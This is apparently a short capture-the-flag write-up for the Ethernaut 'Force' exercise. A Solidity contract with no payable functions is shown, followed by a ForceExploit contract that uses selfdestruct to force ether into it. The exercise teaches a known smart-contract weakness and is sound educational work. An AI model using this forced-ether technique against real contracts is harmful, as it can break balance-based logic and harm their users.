## 7. Force

Goal for this exercise is:

- Make the balance of the contract greater than zero


<br/>

Here is the contract code:
~~~
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
~~~
<br>
This exercise was about `selfdestruct()` function.

Here is the code to solve this:

~~~
pragma solidity ^0.6.0;

contract ForceExploit {
    
    receive() external payable {}
    
    function forceSend(address payable _receiver) external {
        selfdestruct(_receiver);
    }
}
~~~

